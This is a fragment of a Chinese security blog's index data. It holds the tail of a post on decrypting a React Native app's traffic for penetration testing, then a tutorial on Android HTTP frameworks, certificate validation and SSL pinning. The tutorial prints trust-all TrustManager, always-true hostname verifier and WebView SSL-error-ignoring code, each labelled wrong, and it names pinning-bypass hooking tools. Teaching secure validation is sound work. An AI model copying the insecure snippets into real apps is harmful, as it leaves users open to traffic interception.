Solution: str.encode or bytes(s, encoding=\"utf8\") self.wfile.write(str.encode(new_post_values)) except Exception as err: print(err) 最后解决第三个问题 如何在python中运行js代码，进过搜索发现python模块 PyExecJS 提供了非常方便易用的api. 其项目地址https://pypi.org/project/PyExecJS/ 官方提供的简单事例： \u003e\u003e\u003e import execjs \u003e\u003e\u003e execjs.eval(\"'red yellow blue'.split(' ')\") ['red', 'yellow', 'blue'] \u003e\u003e\u003e ctx = execjs.compile(\"\"\" ... function add(x, y) { ... return x + y; ... } ... \"\"\") \u003e\u003e\u003e ctx.call(\"add\", 1, 2) 3 可以看到只需加载编译js，并调用call即可运行js函数。 那剩下的工作就是剥离出“index.android.bundle”中的加密函数，并在httpserver处理响应（wfile.write）时对明文数据调用加密函数处理就好了，so easy！ data_decrpyted = ctx.call('h',data) customInfo_decrpyted = ctx.call('h',customInfo) 所有工作完成，我们来看下前后效果： 正常数据请求\" 正常数据请求 解密后请求\" 解密后请求 现在可以愉快的进行渗透测试了:P ","date":"2018-05-31","objectID":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html:3:0","tags":["burp","react-native"],"title":"内嵌React的android应用流量加解密","uri":"/posts/%E5%86%85%E5%B5%8Creact%E7%9A%84android%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html"},{"categories":["android网络"],"content":"0x00 目的 通过使用HttpClinet、HttpURLConnect、Volley、Okhttp、Retrofit及Webview，快速识别android网络请求框架为了能定位关键代码，完全理解不正确及正确的证书、域名及sslpinning校验过程。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:1:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x01 HttpClient \u0026 HttpURLConnection ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"发送请求 android 6.0 删除HttpClient类库，仍需使用的方法： eclipse：libs中加入org.apache.http.legacy.jar AS：在build.gradle中加入 android { useLibrary 'org.apache.http.legacy' } 使用HttpClient发送Http GET请求 HttpClient mHttpClient = new DefaultHttpClient(); HttpGet mHttpGet = new HttpGet(url); HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet); HttpEntity mHttpEntity = mHttpResponse.getEntity(); DefaultHttpClient with default constructor is not compatible with TLS 1.2 建议使用SystemDefaultHttpClient代替： HttpClient client = new SystemDefaultHttpClient(); or HttpClient client = HttpClientBuilder.create().useSystemProperties().build(); 使用HttpURLConnection发送Http GET请求 URL url = new URL(url); HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection(); InputStream mInputStream = mHttpURLConnection.getInputStream(); 以上代码均能自动处理HTTP和HTTPS请求。 在调用URL的openConnection()方法时，如果URL是HTTP协议的，返回的是一个HttpURLConnection对象，而如果URL是HTTPS协议的，返回的将是一个HttpsURLConnection对象。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:1","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"使用代理 HttpClient使用代理 HttpHost proxy = new HttpHost(\"127.0.0.1\", 9876, \"HTTP\"); HttpParams httpParams = new BasicHttpParams(); httpParams.setParameter(ConnRouteParams.DEFAULT_PROXY, proxy); HttpClient mHttpClient = new DefaultHttpClient(httpParams); HttpGet mHttpGet = new HttpGet(url); HttpResponse mHttpResponse = mHttpClient.execute(mHttpGet); HttpURLConnection使用代理 Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"127.0.0.1\", 9876)); URL mUrl = new URL(url); HttpURLConnection con = (HttpURLConnection) mUrl.openConnection(proxy); HttpClient 不支持 SOCKS HttpURLConnectino 支持 Proxy.Type.SOCKS 使用系统代理 Properties props = System.getProperties(); props.setProperty(\"proxySet\", \"true\"); props.setProperty(\"http.proxyHost\", host); props.setProperty(\"http.proxyPort\", port); 代理https请求：https.proxyHost/Port 代理socks请求：socksProxyHost/Port ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:2","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"https和证书 上面展示了用HttpClient及HttpURLConnect API访问https网站。 特点：由Android系统校验服务端数字证书的合法性，用可信CA签发的数字证书的网站才可以正常访问，私有CA签发的数字证书的网站无法访问。 私有CA签发的证书网站如何访问？ 可以看出如果要进行 SSL 会话，必须得新建一个 SSLSocket 对象，而 SSLSocket对象是通过 SSLSocketFactory 来管理的，SSLSocketFactory对象则依赖于SSLContext ，SSLContext 对象又依赖于 keyManager、TrustManager 和SecureRandom。我们这里最关心的是 TrustManager 对象，正是 TrustManager负责证书的校验。 android Xiaomi MAX证书路径: /system/etc/security/cacerts 准备工作 1. 生成自签证书 生成自己的CA根证书 生成CA私钥文件ca.key： openssl genrsa -out ca.key 1024 生成X.509证书签名请求文件ca.csr： openssl req -new -key ca\\_private.key -out ca.csr 在生成ca.csr的过程中，会让输入一些组织信息等。 生成X.509格式的CA根证书ca_public.crt（公钥证书）： openssl x509 -req -in ca.csr -signkey ca\\_private.key -out ca\\_public.crt 生成服务器证书 先生成服务器私钥文件server_private.key： openssl genrsa -out server\\_private.key 1024 根据服务器私钥生成服务器公钥文件server_public.pem： openssl rsa -in server\\_private.key -pubout -out server\\_public.pem 服务器端需要向CA机构申请签名证书，在申请签名证书之前依然是创建自己的证书签名请求文件server.csr：openssl req -new -key server\\_private.key -out server.csr Warning 对于用于HTTPS的CSR，Common Name必须和网站域名一致，以便之后进行HostName校验。 服务器端用server.csr文件向CA申请证书，签名过程需要CA的公钥证书和私钥参与，最终颁发一个带有CA签名的服务器端证书server.crt：openssl x509 -req -CA ca\\_public.crt -CAkey ca\\_private.key -CAcreateserial -in server.csr -out server.crt 使用webpy搭建服务器，代码详见demo（webpytest.py） 2. 信任所有证书 //证书校验 TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() { @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } } }; //域名校验 HostnameVerifier hostnameVerifier = new HostnameVerifier() { @Override public boolean verify(String s, SSLSession sslSession) { return true; } }; SSLContext mSSLContext = SSLContext.getInstance(\"TLS\"); mSSLContext.init(null, trustAllCerts, new SecureRandom()); URL mUrl = new URL(url); //HttpsURLConnection.setDefaultSSLSocketFactory(mSSLContext.getSocketFactory()); //HttpsURLConnection.setDefaultHostnameVerifier(hostnameVerifier); HttpsURLConnection httpsURLConnection = (HttpsURLConnection) mUrl.openConnection(); httpsURLConnection.setSSLSocketFactory(mSSLContext.getSocketFactory()); httpsURLConnection.setHostnameVerifier(hostnameVerifier); 3. 正确的证书校验 正确实现checkServerTrusted函数： public final void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) { if (x509CertificateArr == null) { throw new IllegalArgumentException(\"check server x509Certificates is null\"); } if (x509CertificateArr.length \u003c 0) { throw new IllegalArgumentException(\"check server x509Certificates is empty\"); } for (X509Certificate cert : x509CertificateArr) { try { cert.checkValidity(); String cername = \"server1.crt\"; InputStream is = new BufferedInputStream(context.getAssets().open(cername)); CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\"); X509Certificate serverCert = (X509Certificate)certificateFactory.generateCertificate(is); cert.verify(serverCert.getPublicKey()); } catch (Exception e e) { e.printStackTrace(); } } } 正确实现域名校验verify函数： public final boolean verify(String str, SSLSession sSLSession) { HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier(); Boolean result = hv.verify(\"*.xxx.com\", sSLSession); return result; } 以上代码为简单实现，还可以从session获取服务器域名与本地证书解析后的域名做比对。 4. SSL Pinning 直接用预埋的证书来生成TrustManger 参数certStream是证书文件的InputSteam流 另外可以用以下命令查看服务器证书的公钥： keytool -printcert -rfc -file uwca.crt 直接复制粘贴可以将公钥信息硬编码在代码中 可以用以下形式获取此公钥对应的X.509证书： ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:2:3","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x02 Volley 在2013年Google I/O大会上推出了一个新的网络通信框架Volley。 Volley is an HTTP library that makes networking for Android apps easier and, most importantly, faster. github Android developer training page android版本大于等于2.3则调用基于HttpURLConnection的HurlStack，否则就调用基于HttpClient的HttpClientStack。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"volley POST请求 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:1","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"Volley + 自定义证书 h修改volley源码（volley.java） 原理和上面讲的一致： 读取证书加载到keyStore，创建TrustManagerFactory对象tmf用keyStore初始化，再创建SSLContext对象用tmf初始化，即可以用SSLContext得到SSLSocketFactory进行自签名证书的网络请求。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:3:2","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x03 OkHttp ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"发送请求 官方事例： OkHttpClient client = new OkHttpClient(); String post(String url, String json) throws IOException { RequestBody body = RequestBody.create(JSON, json); Request request = new Request.Builder() .url(url) .post(body) .build(); Response response = client.newCall(request).execute(); return response.body().string(); } 异步POST请求 OkHttpClient client = new OkHttpClient(); RequestBody formBody = new FormBody.Builder() .add(\"aaa\", \"bbb\") .build(); Request request = new Request.Builder() .url(url) .post(formBody) .build(); client.newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, Response response) throws IOException { return response.body().string(); } }); 实例参见阿里TV助手应用 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:1","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"设置代理 OkHttpClient client = new OkHttpClient.Builder().proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"112.95.91.101\", 9999))).build(); 给OkHttp Client添加socks代理 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:2","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"自签名证书 未校验服务器端证书链、未校验服务端证书域名（信任所有证书及域名）： // wrong checkServerTrusted \u0026 HostnameVerifier TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() { @Override public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } } }; HostnameVerifier hostnameVerifier = new HostnameVerifier() { @Override public boolean verify(String s, SSLSession sslSession) { return true; } }; try { SSLContext sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(null, trustAllCerts, new SecureRandom()); OkHttpClient mOkHttpClient = new OkHttpClient.Builder().hostnameVerifier(hostnameVerifier) .sslSocketFactory(sslContext.getSocketFactory()).build(); okhttp3.Request request = new okhttp3.Request.Builder().url(url).build(); mOkHttpClient.newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { } @Override public void onResponse(Call call, okhttp3.Response response) throws IOException { String body = response.body().string(); Log.i(\"lzm\", \"network---\" + body); } }); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } catch (KeyManagementException e) { e.printStackTrace(); } 正确实现同上，需真正实现 checkServerTrusted 和 verify 函数。详见demo。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:3","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"SSL Pinning OkHttpClient client = new OkHttpClient.Builder() .certificatePinner(new CertificatePinner.Builder() .add(\"publicobject.com\", \"sha256/afwiKY3RxoMmLkuRW1l7QsPZTJPwDS2pdDROQjXw8ig=\") .build()) .build(); Certificate Pinning 获取本地证书 public static CertificatePinner getCertificata() { Certificate ca = null; try { CertificateFactory cf = CertificateFactory.getInstance(\"X.509\"); InputStream caInput = ZMApplication.getZMContext().getResources().openRawResource(R.raw.test); try { ca = cf.generateCertificate(caInput); } finally { caInput.close(); } } catch (CertificateException | IOException e) { e.printStackTrace(); } String certPin = \"\"; if (ca != null) { certPin = CertificatePinner.pin(ca); } CertificatePinner certificatePinner = new CertificatePinner.Builder() .add(UrlConfig.RELEASE_BASE_URL, certPin) .build(); return certificatePinner; } ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:4:4","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x04 Retrofit Retrofit是Square公司开发的一款针对Android网络请求的框架，Retrofit2底层基于OkHttp实现 http://square.github.io/retrofit/ examples ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"发送请求 // 创建接口 public interface HtmlService { @GET(\"/\") Call\u003cString\u003e doIndex(); @FormUrlEncoded @POST(\"/login\") Call\u003cString\u003e doLogin(@Field(\"username\")String name, @Field(\"password\") String password); } // 1. 构建Retrofit对象，addConverterFactory是对response进行解析 Retrofit retrofit = new Retrofit.Builder() .addConverterFactory(ScalarsConverterFactory.create()) .baseUrl(url) .build(); // 2. 动态代理生成接口对象 HtmlService htmlService = retrofit.create(HtmlService.class); // 3. 通过接口的方法得到调用的对象 // Call\u003cString\u003e call = htmlService.doIndex(); //GET Call\u003cString\u003e call = htmlService.doLogin(\"admin\", \"admin\"); //POST // 4. 异步方法得到response call.enqueue(new Callback\u003cString\u003e() { @Override public void onResponse(Call\u003cString\u003e call, retrofit2.Response\u003cString\u003e response) { Log.i(\"lzm\", response.body()); } @Override public void onFailure(Call\u003cString\u003e call, Throwable throwable) { Log.i(\"lzm\", throwable.getMessage()); } }); 使用webpy搭建服务器，代码详见demo（webpytest2.py） 实例参见咪咕TV（miguTV_3.3.0.apk） ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:1","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"自签名证书 Retrofit+OkHttp进行证书校验，而OkHttp证书校验上文已经介绍。 OkHttpClient client = new OkHttpClient.Builder() .sslSocketFactory(HTTPSUtils.getSSLSocketFactory(context)) .hostnameVerifier(HTTPSUtils.getHostNameVerifier(hostUrls)) .build(); Retrofit retrofit = new Retrofit.Builder().baseUrl(baseUrl) .client(client) .build(); ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:2","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x05 WebView ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"发送请求 通过Intent启动webview Uri uri = Uri.parse(url); Intent intent = new Intent(Intent.ACTION_VIEW,uri); startActivity(intent); 创建布局 \u003cWebView android:id=\"@+id/webView\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\"\u003e \u003c/WebView\u003e 使用webview加载页面 webView = (WebView) findViewById(R.id.webView1); webView.getSettings().setAllowUniversalAccessFromFileURLs(true); String url = getIntent().getData().toString(); webView.loadUrl(url); webView.setWebViewClient(new WebViewClient()); ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:1","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"自签名证书 ca 认证的证书，在 WebView 则可以直接显示出来，不需要特殊处理。 服务端采用的是可信CA颁发的证书，需要在webView.setWebViewClient(webviewClient)时重载WebViewClient的onReceivedSslError()。 错误的做法： @Override public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) { handler.proceed(); } 正确写法： 1.安全级别较低的方案：证书出现问题，可以提示用户风险，让用户选择加载与否 webView.setWebViewClient(new WebViewClient() { @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) { final AlertDialog.Builder builder = new AlertDialog.Builder(WebviewActivity.this); SslCertificate sslCertificate = error.getCertificate(); switch (error.getPrimaryError()) { case SslError.SSL_DATE_INVALID: Log.i(\"lzm\", SslError.SSL_DATE_INVALID + \" ssl date invalid\"); break; case SslError.SSL_IDMISMATCH: Log.i(\"lzm\", SslError.SSL_IDMISMATCH + \" hostname dismatch\"); break; case SslError.SSL_EXPIRED: Log.i(\"lzm\", SslError.SSL_EXPIRED + \" cert has expired\"); break; case SslError.SSL_UNTRUSTED: Log.i(\"lzm\", SslError.SSL_UNTRUSTED + \" cert is not trusted\"); break; case SslError.SSL_INVALID: Log.i(\"lzm\", SslError.SSL_INVALID + \" cert is invalid\"); break; case SslError.SSL_NOTYETVALID: Log.i(\"lzm\", SslError.SSL_NOTYETVALID + \" cert is not yet valid\"); break; } builder.setTitle(\"ssl error\"); builder.setMessage(\"ssl error code: \" + error.getPrimaryError()); builder.setPositiveButton(\"proceed\", new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialogInterface, int i) { handler.proceed(); } }); builder.setNegativeButton(\"cancel\", new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialogInterface, int i) { handler.cancel(); } }); final AlertDialog dialog = builder.create(); dialog.show(); } }); 2.安全的方案是当出现了证书问题的时候，读取本地保存的的根证书，然后与服务器校验，通过则继续执行 handler.proceed()，否则执行 handler.cancel()。 webView.setWebViewClient(new WebViewClient() { @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) { checkCAweb(handler, view.getUrl()); } }); private void checkCAweb(final SslErrorHandler handler, String url) { OkHttpClient.Builder builder = setCer(new OkHttpClient.Builder()); Request request = new Request.Builder().url(url).build(); builder.build().newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { Log.i(\"lzmtest\", e.getMessage()); handler.cancel(); } @Override public void onResponse(Call call, Response response) throws IOException { Log.i(\"lzmtest\", response.body().string()); handler.proceed(); } }); } private OkHttpClient.Builder setCer(OkHttpClient.Builder client) { try { SSLContext sslContext = SSLContext.getInstance(\"TLS\"); // 正确实现服务器证书校验 trustCert，见上文 sslContext.init(null, trustCert, new SecureRandom()); client.sslSocketFactory(sslContext.getSocketFactory()); // 正确实现域名校验 verify，见上文 client.hostnameVerifier(new MyHostnameVerifier()); } catch (Exception e) { e.printStackTrace(); } return client; } 具体程序见demo (webviewtest.apk) ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:2","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"SSL Pinning Android-SSL-Pinning-WebViews 基本实现和上文保持一致：初始化keyStore，将可信证书（本地or硬编码）加入keyStore，在TrustManagerFactory中初始化keyStore，设置SSLcontext，用TrustManager初始化。使用网络请求框架（HttpURLConnect，OkHttp等）设置SocketFactory，setSSLSocketFactory(sslContext.getSocketFactory())。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:3","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"0x06 小结 建议开发或对https方面不了解的安全测试同学查看android开发指南之通过HTTPS 和 SSL确保安全。 正确实现https也可通过Hook方式绕过，android下常用的有Xposed工具： JustTrustMe SSLUnpinning 及Frida工具： objection frida-android-repinning 想保证通信安全，敏感信息还应该做二次加密，接口做签名，客户端本身防Hook等。 ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:7:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["android网络"],"content":"参考 [1]https://developer.android.com/training/articles/security-ssl.html [2]https://www.cnblogs.com/liyiran/p/7011317.html [3]https://jaq.alibaba.com/community/art/show?articleid=545 [4]http://liuwangshu.cn/tags/Android%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/ [5]https://blog.csdn.net/sbsujjbcy/article/details/45568053 [6]http://find-sec-bugs.github.io/bugs.htm [7]https://blog.it-securityguard.com/the-stony-path-of-android-%F0%9F%A4%96-bug-bounty-bypassing-certificate-pinning/ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:8:0","tags":["https","sslpinning"],"title":"android网络请求\u0026证书认证","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"}]